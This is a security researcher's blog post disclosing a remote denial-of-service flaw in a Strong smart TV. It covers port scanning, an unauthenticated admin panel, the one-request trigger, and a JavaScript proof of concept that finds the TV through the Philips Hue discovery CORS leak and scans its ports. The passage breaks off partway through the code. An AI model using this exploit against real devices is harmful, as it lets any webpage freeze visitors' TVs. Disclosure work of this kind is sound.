<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <link rel="icon" href="/assets/img/favicon.ico"/>
    <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="/feed.xml" />

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Exploiting remote DoS vulnerability in my not-so-smart TV | Kamil Vavra @vavkamil</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Exploiting remote DoS vulnerability in my not-so-smart TV" />
<meta name="author" content="vavkamil" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="tl;dr: I found a remotely exploitable DoS vulnerability in my ‚Äúsmart‚Äù TV in less than two hours after unboxing. I have released full details, including a 0-day PoC exploit." />
<meta property="og:description" content="tl;dr: I found a remotely exploitable DoS vulnerability in my ‚Äúsmart‚Äù TV in less than two hours after unboxing. I have released full details, including a 0-day PoC exploit." />
<link rel="canonical" href="http://localhost:4000/blog/2021-03-11-exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv/" />
<meta property="og:url" content="http://localhost:4000/blog/2021-03-11-exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv/" />
<meta property="og:site_name" content="Kamil Vavra @vavkamil" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-03-11T01:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Exploiting remote DoS vulnerability in my not-so-smart TV" />
<meta name="twitter:site" content="@vavkamil" />
<meta name="twitter:creator" content="@vavkamil" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"vavkamil"},"dateModified":"2021-03-11T01:00:00+01:00","datePublished":"2021-03-11T01:00:00+01:00","description":"tl;dr: I found a remotely exploitable DoS vulnerability in my ‚Äúsmart‚Äù TV in less than two hours after unboxing. I have released full details, including a 0-day PoC exploit.","headline":"Exploiting remote DoS vulnerability in my not-so-smart TV","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2021-03-11-exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv/"},"url":"http://localhost:4000/blog/2021-03-11-exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv/"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Kamil Vavra | @vavkamil</h1>
        </a>
        <h2>Offensive website security | Bug bounty | Ethical hacking</h2>

        <section id="downloads">
          <a href="/talks" class="btn"><span class="icon">üì¢</span>Talks</a>
          <a href="/whoami" class="btn"><span class="icon">üïµÔ∏è</span>Whoami</a>
          <a href="/bug-bounty" class="btn"><span class="icon">üí∞</span>Bug bounty</a>
          <a href="/blog" class="btn"><span class="icon">üìñ</span>Blog</a>
          <a href="https://github.com/vavkamil" target="_blank" class="btn"><span class="icon">üíª</span>GitHub</a>
          <a href="https://www.linkedin.com/in/vavkamil/" target="_blank" class="btn"><span class="icon">üèÜ</span>LinkedIn</a>
          <a href="/contact" class="btn"><span class="icon">üì©</span>Contact</a><br><br>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <small>11 March 2021</small>
<h1>Exploiting remote DoS vulnerability in my not-so-smart TV</h1>

<p class="view">by vavkamil</p>

<div>



  <p>15 minutes to read</p>

</div>

<p>tl;dr: I found a remotely exploitable DoS vulnerability in my ‚Äúsmart‚Äù TV in less than <a href="https://twitter.com/vavkamil/status/1336088348113448960">two hours</a> after unboxing. I have released full details, including a 0-day PoC exploit.</p>

<hr />

<p>I bought myself a smart TV for Christmas. It‚Äôs the first TV which I ever owned, so I was quite excited about it, but at the same time, I didn‚Äôt want something fancy. It was hard to find something with 4k resolution without a camera/microphone and unnecessary functions, potentially increasing the attack surface. I ended up buying an ordinary one with YouTube &amp; Netflix support (<em><a href="https://www.strong.tv/en/products/ultra-hd/srt43ub6203">SRT 43UB6203 (43‚Äù/108 cm) - 10 bit</a></em>).</p>

<p><img src="/assets/img/2021/03/SRT-43UB6203.jpg" alt="" title="SRT 43UB6203" /></p>

<p>After unboxing and setting it up, the first thing which I did was a firmware update. The latest software version is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current version: V8-MS586EU-LF1V104
Product name: 43D1901
Date: May 23 201908:38:07
</code></pre></div></div>

<hr />

<h3 id="recon">Recon</h3>

<p>After the update, I continued with an <strong>nmap</strong> scan to see which (if any) ports are exposed:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vavkamil@xexexe:~$ nmap -p- 10.10.10.249
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-07 19:05 CET
Nmap scan report for 10.10.10.249
Host is up (0.0064s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE
4123/tcp  open  z-wave
5978/tcp  open  ncd-diag-tcp
8989/tcp  open  sunwebadmins
51604/tcp open  unknown
52091/tcp open  unknown
54656/tcp open  unknown
55028/tcp open  unknown
55683/tcp open  unknown
55699/tcp open  unknown
61414/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
</code></pre></div></div>

<p>I don‚Äôt know if that‚Äôs normal or what I was even expecting, but I was more interested in looking into some web interface since I do mostly web security stuff. Unfortunately, after trying each IP:port combination in the browser, there wasn‚Äôt anything useful.</p>

<p>So I tried Burp Suite‚Äôs ‚Äú<strong>Discovery content</strong>‚Äù scan from the ‚Äú<em>Engagement tools</em>‚Äù section. Some ports were not responding at all, or there were some XML configs - most likely for the FastCast/Miracast feature (UPnP/1.0 AwoX/1.1) to cast YouTube videos from the phone. I then hit the jackpot and found what I was looking for, the ‚Äúadmin‚Äù panel without any authentication.</p>

<p><img src="/assets/img/2021/03/content-discovery.png" alt="" title="Burp Suite - Discovery content" /></p>

<hr />

<h3 id="exploitation">Exploitation</h3>

<p>Looking at the <strong>Media Renderer Administration</strong> web interface, I was confident that I found a command injection and possible RCE. It‚Äôs an endpoint to change <em>Friendly Name</em>, which is used to discover the TV and is visible during casting, and it says:</p>

<blockquote>
  <p><em>Note: You can use the <strong>%hostname%</strong> variable as a placeholder for the actual device hostname.</em></p>
</blockquote>

<p><img src="/assets/img/2021/03/media-renderer.png" alt="" title="Media Renderer Administration" /></p>

<p>I precisely followed the instructions and set the Friendly Name as <em>%hostname%</em>. To my surprise, it didn‚Äôt work, and the TV completely froze instead. The TV remote stopped working, and the whole thing became unresponsive. Even the hardware buttons at the bottom did nothing. At that point, I was pretty much disappointed, as I thought that I just bricked my one-hour-old television.</p>

<p>Only after unplugging the power cord to do the hard reset, it returned to normal. I continued messing up with the command injection payloads, but it ended up with a <strong>Denial of Service</strong> (DoS) every time. Just a note that after each restart, the web interface is listening on a different dynamic port (49152 - 65535), so one has to repeat the recon phase.</p>

<p>At that point, I summarized my notes and reached to a vendor via the contact form on their website.</p>

<hr />

<h3 id="proof-of-concept">Proof of Concept</h3>

<p>After a couple of days passed, I spent an evening writing a Proof of Concept to confirm that the issue is remotely exploitable. The first step was to determine the internal IP range. WebRTC leak didn‚Äôt work for me, but since I also own Philips Hue smart light bulbs, I decided to work with that. Thanks to the CORS ‚Äúmisconfiguration‚Äù, any website you visit can check the internal IP address of your Hue Bridge. You can see the <a href="https://gist.github.com/vavkamil/9b77125eb4b6c7ff971aa9fa6b62e7ba">source code</a> or PoC for that <a href="https://xss.vavkamil.cz/hue-cors.html">here</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vavkamil@xexexe:~$ curl -v -s https://discovery.meethue.com/
...
&lt; HTTP/2 200 
&lt; access-control-allow-credentials: true
&lt; access-control-allow-headers: Origin, X-Requested-With, Content-Type, Accept, X-Token, X-Bridge
&lt; access-control-allow-methods: GET, OPTIONS
&lt; access-control-allow-origin: *
&lt; cache-control: no-cache
&lt; content-type: application/json; charset=utf-8
&lt; content-length: 63
&lt; via: 1.1 google
&lt; alt-svc: clear
&lt; 
[{"id":"ecb5fafffe128375","internalipaddress":"10.10.10.253"}]
* Connection #0 to host discovery.meethue.com left intact
</code></pre></div></div>

<p>After discovering the internal IP range, we can leverage the fact that there is always a service listening on port 4123 and do a port scan for that. Thanks to the lack of X-Frame-Options, we can try to load each IP:port pair in an iframe. Unfortunately, the connection to port 4123 will hang out, but it will eventually load after 1:30 minutes (at least in Mozilla Firefox). We can either wait or use a timer on the iframe to detect that it‚Äôs loading.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vavkamil@xexexe:~$ curl http://10.10.10.249:4123
curl: (1) Received HTTP/0.9 when not allowed

vavkamil@xexexe:~$ telnet 10.10.10.249 4123
Trying 10.10.10.249...
Connected to 10.10.10.249.
Escape character is '^]'.

&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;root&gt;&lt;response&gt;true&lt;/response&gt;&lt;/root&gt;
</code></pre></div></div>

<p>Once we know the smart TV‚Äôs internal IP address, we have to scan all of its dynamic ports to find the <em>Media Renderer Administration</em>. I used the same technique, which is popular in the <a href="https://vavkamil.cz/2019/12/11/an-introduction-to-the-router-exploit-kits/">Router Exploit Kits</a>, loading the admin panel logo in the <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag. Then it‚Äôs just a matter of sending one unauthenticated GET request to cause a <em>Denial of Service</em> until the power cord is unplugged:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://{IP:PORT}/web/admin/setFriendlyName?name=%hostname%
</code></pre></div></div>

<p>The <a href="https://gist.github.com/vavkamil/1b1c14702198dd721c4d478ac15d0ac0">Proof of Concept code</a> is very messy and could be optimized to be much faster, but it works :)</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;&lt;</span><span class="sr">/title</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Strong</span> <span class="nx">TV</span> <span class="nx">DoS</span> <span class="nx">exploit</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Any</span> <span class="nx">internal</span> <span class="nx">IP</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span> <span class="nx">onchange</span><span class="o">=</span><span class="dl">"</span><span class="s2">get_tv_ip()</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Smart</span> <span class="nx">TV</span> <span class="nx">IP</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span> <span class="nx">onchange</span><span class="o">=</span><span class="dl">"</span><span class="s2">scan_tv_ports()</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Smart</span> <span class="nx">TV</span> <span class="nx">Port</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">This</span> <span class="nx">may</span> <span class="nx">take</span> <span class="nx">a</span> <span class="nx">couple</span> <span class="k">of</span> <span class="nx">minutes</span><span class="o">&lt;</span><span class="sr">/em</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Media</span> <span class="nx">Renderer</span> <span class="nx">Administration</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Exploit</span> <span class="nx">code</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">width:680px;height:130px;</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Exploit</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span> <span class="nx">target</span><span class="o">=</span><span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
            <span class="nf">get_hue_ip</span><span class="p">();</span>

            <span class="k">async</span> <span class="kd">function</span> <span class="nf">scan_tv_ports</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="c1">// dynamic ports 49152 - 65535</span>
                <span class="kd">var</span> <span class="nx">ports</span> <span class="o">=</span> <span class="nf">get_ports_array</span><span class="p">(</span><span class="mi">49152</span><span class="p">,</span><span class="mi">65535</span><span class="p">);</span>

                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ports</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">check</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>

                    <span class="k">await</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">50</span><span class="p">));</span>

                    <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="nx">ip</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="nx">ports</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web/file/largeIco.jpg</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="c1">//img.style.display = "none";</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">ports</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">ip</span><span class="p">;</span>

                    <span class="nx">img</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="nx">check</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web</span><span class="dl">"</span><span class="p">;</span>
                        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="dl">"</span><span class="se">\</span><span class="s2">
&lt;script&gt;</span><span class="se">\n\</span><span class="s2">
  function submitRequest() {</span><span class="se">\n\</span><span class="s2">
    var xhr = new XMLHttpRequest();</span><span class="se">\n\</span><span class="s2">
    xhr.open('GET', '</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">/admin/setFriendlyName?name=%hostname%', true);</span><span class="se">\n\</span><span class="s2">
    xhr.send();</span><span class="se">\n\</span><span class="s2">
  }</span><span class="se">\n\</span><span class="s2">
  submitRequest();</span><span class="se">\n\</span><span class="s2">
&lt;</span><span class="se">\</span><span class="s2">/script&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">code</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span><span class="p">).</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">/admin/setFriendlyName?name=%hostname%</span><span class="dl">"</span><span class="p">;</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>

                    <span class="p">};</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span>
                    <span class="nf">setTimeout</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">this</span><span class="p">.</span><span class="k">continue</span><span class="p">;</span>
                    <span class="p">},</span> <span class="mi">50</span><span class="p">);</span>
                    
                <span class="p">}</span>
                <span class="kd">var</span> <span class="nx">imgs</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">img</span><span class="dl">'</span><span class="p">);</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">imgs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">imgs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">imgs</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">get_tv_ip</span><span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">local_ip</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">ips</span> <span class="o">=</span> <span class="nf">ip_to_range</span><span class="p">(</span><span class="nx">local_ip</span><span class="p">);</span>
                <span class="nf">scan</span><span class="p">(</span><span class="nx">ips</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">get_hue_ip</span><span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
                <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://discovery.meethue.com/</span><span class="dl">"</span><span class="p">)</span>
                <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
                <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">hue_ip</span><span class="p">;</span>
                    <span class="k">if </span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
                        <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
                        <span class="nx">hue_ip</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">internalipaddress</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">hue_ip</span><span class="p">;</span>
                        <span class="nf">get_tv_ip</span><span class="p">();</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">ip_to_range</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">ips</span> <span class="o">=</span> <span class="p">[];</span>
                <span class="kd">var</span> <span class="nx">ip_parts</span> <span class="o">=</span> <span class="nx">ip</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="p">);</span>
                <span class="k">if</span><span class="p">(</span> <span class="nx">ip_parts</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">4</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">for</span><span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">255</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">tmp_ip</span> <span class="o">=</span> <span class="nx">ip_parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">ip_parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">ip_parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">i</span><span class="p">;</span>
                    <span class="nx">ips</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span> <span class="nx">tmp_ip</span> <span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">ips</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">get_ports_array</span><span class="p">(</span><span class="nx">lowEnd</span><span class="p">,</span> <span class="nx">highEnd</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">ports</span> <span class="o">=</span> <span class="p">[];</span>
